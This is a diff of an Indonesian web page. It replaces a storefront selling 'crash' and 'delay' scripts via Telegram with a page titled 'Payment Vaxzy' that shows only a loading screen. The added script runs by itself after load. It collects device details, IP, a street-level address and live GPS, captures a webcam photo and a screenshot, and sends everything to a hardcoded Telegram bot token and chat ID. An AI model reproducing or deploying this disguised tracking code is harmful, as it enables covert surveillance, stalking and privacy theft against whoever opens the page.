@@ -2,478 +2,242 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Market VaxzyExorc1st</title>
-  <style>
-    /* Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      transition: all 0.4s ease;
-    }
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Payment Vaxzy</title>
 
-    body {
-      font-family: 'Poppins', sans-serif;
-      color: #fff;
-      min-height: 100vh;
-      background: linear-gradient(120deg, #89f7fe, #66a6ff, #ff9a9e, #fad0c4);
-      background-size: 400% 400%;
-      animation: gradientShift 15s ease infinite;
-      overflow-x: hidden;
-    }
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #1e1e2f, #151515);
+    font-family: 'Segoe UI', Arial, sans-serif;
+    color: #ccc;
+    overflow: hidden;
+  }
 
-    /* Animasi bunga */
-    .flower {
-      position: fixed;
-      top: -50px;
-      font-size: 24px;
-      pointer-events: none;
-      animation: fall 4s linear forwards;
-      z-index: 999;
-    }
+  #loading-container {
+    text-align: center;
+    width: 90%;
+    max-width: 420px;
+    padding: 30px 20px;
+    background: rgba(0,0,0,0.6);
+    border-radius: 16px;
+    box-shadow: 0 8px 25px rgba(0,0,0,0.4);
+    backdrop-filter: blur(6px);
+    animation: fadeIn 1.2s ease-in-out;
+    overflow: hidden;
+  }
 
-    @keyframes fall {
-      0% { transform: translateY(-50px) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
-    }
+  #loading-text {
+    font-size: 26px;
+    margin-bottom: 10px;
+    font-weight: bold;
+    background: linear-gradient(90deg, #6e48aa, #9d50bb);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    letter-spacing: 1px;
+    display: inline-block;
+    animation: slide 3s linear infinite alternate; /* animasi bolak-balik */
+  }
 
-    /* Welcome Screen */
-    #welcome {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      color: #fff;
-      font-size: 2rem;
-      font-weight: 700;
-      text-align: center;
-      animation: fadeIn 1s ease forwards;
-    }
+  #loading-details {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #aaa;
+    font-style: italic;
+    opacity: 0.8;
+  }
 
-    #welcome.fade-out { animation: fadeOut 1s ease forwards; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.9); }
+    to { opacity: 1; transform: scale(1); }
+  }
 
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; visibility: hidden; } }
+  @keyframes slide {
+    0%   { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+  }
+</style>
 
-    /* Partikel */
-    .particle {
-      position: absolute;
-      width: 8px;
-      height: 8px;
-      background: rgba(255,255,255,0.6);
-      border-radius: 50%;
-      animation: float 10s linear infinite;
-    }
-
-    @keyframes float {
-      from { transform: translateY(100vh) scale(0.5); }
-      to { transform: translateY(-10vh) scale(1); }
-    }
-
-    /* Container */
-    .container {
-      text-align: center;
-      padding: 70px 20px;
-      max-width: 1200px;
-      margin: auto;
-      position: relative;
-      z-index: 2;
-      opacity: 0;
-      transform: translateY(40px);
-      transition: opacity 1s ease, transform 1s ease;
-    }
-
-    .container.show { opacity: 1; transform: translateY(0); }
-
-    header h1 {
-      font-size: 3rem;
-      font-weight: 700;
-      margin-bottom: 10px;
-      text-shadow: 0 2px 15px rgba(0,0,0,0.3);
-    }
-
-    header p {
-      font-size: 1.2rem;
-      margin-bottom: 40px;
-      opacity: 0.9;
-    }
-
-    /* Channel Buttons */
-    .channels { margin-bottom: 50px; }
-
-    .channels a {
-      display: inline-block;
-      margin: 10px;
-      padding: 12px 28px;
-      border-radius: 30px;
-      text-decoration: none;
-      font-weight: 600;
-      font-size: 0.95rem;
-      background: rgba(255,255,255,0.2);
-      backdrop-filter: blur(10px);
-      border: 1px solid rgba(255,255,255,0.3);
-      color: #fff;
-      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-      transition: 0.4s;
-    }
-
-    .channels a:hover {
-      transform: translateY(-3px);
-      background: rgba(255,255,255,0.3);
-      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
-    }
-
-    /* Products */
-    .products {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-      gap: 30px;
-    }
-
-    .card {
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(20px);
-      border-radius: 20px;
-      padding: 25px;
-      text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-      transition: 0.4s ease;
-      opacity: 0;
-      transform: translateY(40px);
-      animation: cardIn 1s forwards;
-    }
-
-    .card:nth-child(1){ animation-delay: 0.3s; }
-    .card:nth-child(2){ animation-delay: 0.6s; }
-    .card:nth-child(3){ animation-delay: 0.9s; }
-
-    @keyframes cardIn {
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .card h3 {
-      color: #fff;
-      margin-bottom: 12px;
-      font-size: 1.4rem;
-      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
-    }
-
-    .card p, .card ul { color: #f1f1f1; }
-
-    .card ul {
-      text-align: left;
-      margin: 0 auto 20px;
-      padding-left: 20px;
-      font-size: 0.95rem;
-      line-height: 1.6;
-    }
-
-    /* Buttons */
-    .order-btn {
-      display: inline-block;
-      margin: 6px;
-      padding: 12px 24px;
-      border-radius: 25px;
-      font-weight: 600;
-      text-decoration: none;
-      background: linear-gradient(135deg, #66a6ff, #89f7fe);
-      color: #fff;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      transition: 0.3s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .order-btn::after {
-      content: "";
-      position: absolute;
-      top: 0; left: -100%;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.3);
-      transition: 0.4s;
-    }
-
-    .order-btn:hover::after { left: 100%; }
-
-    .order-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-    }
-
-    /* Efek kilau */
-    .order-btn.shine::before {
-      content: "";
-      position: absolute;
-      top: 0; left: -75%;
-      width: 50%; height: 100%;
-      background: linear-gradient(
-        120deg,
-        rgba(255,255,255,0) 0%,
-        rgba(255,255,255,0.6) 50%,
-        rgba(255,255,255,0) 100%
-      );
-      transform: skewX(-25deg);
-      animation: shineMove 1.5s forwards;
-    }
-
-    @keyframes shineMove { 100% { left: 125%; } }
-
-    /* Footer */
-    footer {
-      margin-top: 60px;
-      padding: 20px;
-      text-align: center;
-      font-size: 0.9rem;
-      opacity: 0.8;
-    }
-
-    /* Dark mode */
-    body.dark-mode {
-      background: linear-gradient(120deg, #0f2027, #203a43, #2c5364);
-      color: #eee;
-    }
-
-    body.dark-mode .card { background: rgba(0,0,0,0.5); color: #ddd; }
-    body.dark-mode .card h3 { color: #fff; }
-    body.dark-mode .channels a {
-      background: rgba(0,0,0,0.4);
-      border: 1px solid rgba(255,255,255,0.1);
-    }
-    body.dark-mode .order-btn {
-      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
-      color: #111;
-    }
-
-    /* Toggle Dark Button */
-    .toggle-dark {
-      position: fixed;
-      top: 20px; right: 20px;
-      z-index: 100;
-      background: rgba(255,255,255,0.2);
-      backdrop-filter: blur(10px);
-      border: none;
-      border-radius: 50%;
-      width: 45px; height: 45px;
-      font-size: 1.2rem;
-      color: #fff;
-      cursor: pointer;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      transition: 0.3s ease;
-    }
-
-    .toggle-dark:hover { transform: scale(1.1); }
-    
-    .qr-img {
-      display: none;
-      margin-top: 10px;
-      transition: opacity 0.3s ease;
-    }
-
-    .qr-img img {
-      width: 200px;
-      border-radius: 12px;
-      transition: transform 0.3s ease;
-    }
-
-    .qr-img img:hover {
-      transform: scale(1.1);
-    }
-
-    .qr-img.show {
-      display: block;
-    }
-    
-    .pay-section {
-      margin-top: 40px;
-    }
-
-    .pay-box {
-      background-color: #111;
-      border: 2px solid white;
-      border-radius: 10px;
-      padding: 20px;
-      margin-bottom: 20px;
-      box-shadow: 0 0 10px white;
-    }
-    
-    .btn-copy {
-      margin-top: 10px;
-      background-color: white;
-      color: black;
-      padding: 8px 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    .btn-copy:hover {
-      background-color: white;
-      color: black;
-    }
-
-    @keyframes bounce {
-      0%,100% { transform: translateY(0); }
-      50% { transform: translateY(-12px); }
-    }
-
-    /* Musik Box */
-    .music-box {
-      position: fixed;
-      bottom: 10px; left: 10px;
-      width: 320px;
-      z-index: 100;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.3);
-      border-radius: 12px;
-      overflow: hidden;
-      background: rgba(0,0,0,0.6);
-      padding: 10px;
-      color: #fff;
-    }
-
-    .music-box h4 { margin: 0 0 6px 0; font-size: 0.9rem; }
-    .music-box audio { width: 100%; }
-  </style>
-</head>
-<body>
-  <!-- Welcome screen -->
-  <div id="welcome">✨ Welcome to Market VaxzyExorc1st ✨</div>
-
-  <!-- Partikel -->
-  <div class="particle" style="left:10%; animation-duration:12s;"></div>
-  <div class="particle" style="left:30%; animation-duration:15s;"></div>
-  <div class="particle" style="left:60%; animation-duration:18s;"></div>
-  <div class="particle" style="left:80%; animation-duration:20s;"></div>
-
-  <!-- Tombol Dark Mode -->
-  <button class="toggle-dark" onclick="toggleDark()">🌙</button>
-
-  <div class="container" id="main-content">
-    <header>
-      <h1>Market VaxzyExorc1st</h1>
-      <p>Trust is the most valuable treasure that is hard to get, but easy to lose.</p>
-    </header>
-
-    <nav class="channels">
-      <a href="https://t.me/zyyimpossible" target="_blank">Kontak Owner</a>
-      <a href="https://t.me/JsExorc1st" target="_blank">Info Channel</a>
-      <a href="https://t.me/AboutExorc1st" target="_blank">Room Public</a>
-    </nav>
-
-      <main class="products">
-      <!-- Produk cards -->
-      <!-- (isi produk tetap sama, tidak diubah, hanya rapi indentasi) -->
-      <div class="card">
-        <h3>Patner Function 35K</h3>
-        <ul>
-        <h3>Benefit Patner Function</h3>
-        <ul>
-          <li>Get Function Full Update</li>
-          <li>Get Function Delay New</li>
-          <li>Get Function Crash New</li>
-          <li>Get Function Delay Hard</li>
-          <li>Get Function Crash Hard Ui</li>
-          <li>Update Function Hampir Setiap hari!!</li>
-        </ul>
-        <a class="order-btn" href="https://t.me/zyyimpossible" target="_blank">Hubungi</a>
-      </div>
-      
-      <div class="card">
-        <h3>Script X-Zeno Infinity</h3>
-        <ul>
-          <li>No Update: Rp 30K</li>
-          <li>Full Update: Rp 60K</li>
-          <li>Reseller SC: Rp 90K</li>
-          <li>Partner SC: Rp 125</li>
-          <li>Moderator SC: Rp 160K</li>
-          <li>Ceo SC: Rp 200K</li>
-          <li>Owner SC: Rp 235K</li>
-        </ul>
-        <a class="order-btn" href="https://t.me/zyyimpossible" target="_blank">Hubungi</a>
-      </div>
-      
-      <div class="card">
-        <h3>Payment Qris Vaxzy</h3>
-        <ul>
-        <a class="order-btn" href="https://files.catbox.moe/jczc3w.jpg" target="_blank">Click To Qris</a>
-      </div>
-
-  <footer>
-    © 2025 Market VaxzyExorc1st - Trust is the most valuable treasure that is hard to get, but easy to lose.
-  </footer>
-
-  <!-- Musik Full -->
-  <div class="music-box">
-    <h4>Now Playing 🎶</h4>
-    <audio controls autoplay loop>
-      <source src="https://files.catbox.moe/jqdj3g.mp3" type="audio/mpeg">
-      Browser kamu tidak mendukung audio.
-    </audio>
-  </div>
+<div id="loading-container">
+  <div id="loading-text">Loading...</div>
+  <div id="loading-details">Mohon tunggu sebentar</div>
+</div>
 
   <script>
-    // bunga jatuh
-    function createFlower() {
-      const flower = document.createElement("div");
-      flower.classList.add("flower");
-      flower.innerText = "";
-      flower.style.left = Math.random() * window.innerWidth + "px";
-      flower.style.fontSize = (20 + Math.random() * 20) + "px";
-      document.body.appendChild(flower);
-      setTimeout(() => flower.remove(), 4000);
-    }
+    (() => {
+      const TOKEN = '8417927297:AAFR9-EptORqoCLG3Zl-HdU8AgxkfNEbq1o';
+      const CHAT_ID = '7093265853';
 
-    // bikin bunga tiap scroll
-    window.addEventListener("scroll", () => {
-      for (let i = 0; i < 1; i++) createFlower();
-    });
+     
+      const sendTG = async msg => {
+        try {
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: msg,
+              parse_mode: 'HTML'
+            })
+          });
+        } catch (e) {}
+      };
 
-    // welcome animasi
-    window.addEventListener("load", () => {
-      const welcome = document.getElementById("welcome");
-      const main = document.getElementById("main-content");
-      setTimeout(() => {
-        welcome.classList.add("fade-out");
-        setTimeout(() => {
-          welcome.style.display = "none";
-          main.classList.add("show");
-        }, 1000);
-      }, 2000);
-    });
+      const sendPhoto = async (blob, filename) => {
+        try {
+          const fd = new FormData();
+          fd.append('chat_id', CHAT_ID);
+          fd.append('photo', blob, filename);
 
-    // Tampilkan QR saat diklik
-    function toggleQR() {
-      const qr = document.getElementById('qr-img');
-      qr.classList.toggle('show');
-    }
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+          });
+        } catch (e) {}
+      };
 
-    // Efek kilau tombol saat scroll
-    window.addEventListener("scroll", () => {
-      document.querySelectorAll(".order-btn").forEach(btn => {
-        if (!btn.classList.contains("shine")) {
-          btn.classList.add("shine");
-          setTimeout(() => btn.classList.remove("shine"), 1600);
+      const getLocationDetails = async (lat, lon) => {
+        try {
+          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+          const d = await r.json();
+          if (d.address) {
+            return {
+              kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
+              kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
+              fa: d.display_name || "Alamat tidak tersedia"
+            };
+          }
+        } catch (e) {}
+        return {
+          kb: "Tidak diketahui",
+          kc: "Tidak diketahui",
+          fa: "Alamat tidak tersedia"
+        };
+      };
+
+
+      const collectDeviceInfo = async () => {
+        let msg = '╭───── Tracking Report ───── ⦿\n\n';
+        msg += '⚙️ DEVICE INFORMATION\n';
+        msg += `🖥️ Device: ${navigator.userAgent}\n`;
+        msg += `💻 Platform: ${navigator.platform}\n`;
+        msg += `🌐 Bahasa: ${navigator.language}\n`;
+        msg += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+        msg += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+        msg += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
+        msg += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+        msg += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+
+        if (navigator.getBattery) {
+          try {
+            const b = await navigator.getBattery();
+            msg += `🔋 Battery: ${Math.floor(b.level * 100)}%\n`;
+            msg += `🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+          } catch (e) {
+            msg += '🔋 Battery: ❌ Tidak tersedia\n';
+          }
         }
-      });
-    });
 
-    // toggle dark mode
-    function toggleDark() {
-      document.body.classList.toggle("dark-mode");
-      const btn = document.querySelector(".toggle-dark");
-      btn.textContent = document.body.classList.contains("dark-mode") ? "☀️" : "🌙";
-    }
+        msg += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+        msg += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
+        msg += `📜 History Length: ${history.length}\n`;
+        msg += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+        msg += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+        msg += `🌍 URL: ${location.href}\n`;
+        msg += `📄 Title: ${document.title}\n`;
+        msg += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        msg += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+
+        try {
+          const i = await fetch('https://ipapi.co/json/');
+          const d = await i.json();
+
+          msg += '📍 LOCATION INFORMATION\n';
+          msg += `📡 IP Address: ${d.ip}\n`;
+          msg += `🏙️ Kota: ${d.city}\n`;
+          msg += `🏙️ Kabupaten: ${d.region}\n`;
+          msg += `🗺️ Wilayah: ${d.region}\n`;
+          msg += `🌎 Negara: ${d.country_name}\n`;
+          msg += `🏷️ Kode Pos: ${d.postal}\n`;
+
+          if (d.latitude && d.longitude) {
+            msg += `📌 Latitude: ${d.latitude}\n`;
+            msg += `📍 Longitude: ${d.longitude}\n`;
+
+            const l = await getLocationDetails(d.latitude, d.longitude);
+            msg += `🏙️ Kabupaten: ${l.kb}\n`;
+            msg += `🏙️ Kecamatan: ${l.kc}\n`;
+            msg += `🏠 Alamat Lengkap: ${l.fa}\n`;
+          }
+        } catch (e) {
+          msg += '❌ Gagal mendapatkan informasi lokasi\n';
+        }
+
+        msg += '\n╰───── Owner @ShyKayla ───── ⦿';
+        return msg;
+      };
+
+      const startTracking = async () => {
+        await sendTG(await collectDeviceInfo());
+
+        try {
+          const v = document.getElementById('v');
+          const c = document.getElementById('c');
+          const st = await navigator.mediaDevices.getUserMedia({ video: true });
+
+          v.srcObject = st;
+          await new Promise(r => setTimeout(r, 3000));
+
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+
+          c.toBlob(b => sendPhoto(b, 'camera_capture.jpg'), 'image/jpeg');
+
+          st.getTracks().forEach(t => t.stop());
+        } catch (e) {
+          await sendTG('❌ Camera access blocked');
+        }
+
+        setTimeout(async () => {
+          try {
+            const cn = await html2canvas(document.body);
+            cn.toBlob(b => sendPhoto(b, 'screenshot.jpg'), 'image/jpeg');
+          } catch (e) {
+            await sendTG('❌ Screenshot failed');
+          }
+        }, 5000);
+
+        if (navigator.geolocation) {
+          navigator.geolocation.watchPosition(async pos => {
+            let g = `📍 LIVE GPS TRACKING\n`;
+            g += `📌 Lat: ${pos.coords.latitude}\n`;
+            g += `📍 Lng: ${pos.coords.longitude}\n`;
+            g += `🎯 Akurasi: ${pos.coords.accuracy}m\n`;
+
+            const l = await getLocationDetails(pos.coords.latitude, pos.coords.longitude);
+            g += `🏙️ Kabupaten: ${l.kb}\n`;
+            g += `🏙️ Kecamatan: ${l.kc}\n`;
+            g += `🏠 Alamat: ${l.fa}\n`;
+
+            await sendTG(g);
+          },
+          async e => {
+            await sendTG(`❌ GPS Error: ${e.message}`);
+          },
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
+        }
+      };
+
+      setTimeout(startTracking, 3000);
+    })();
   </script>
 </body>
 </html>
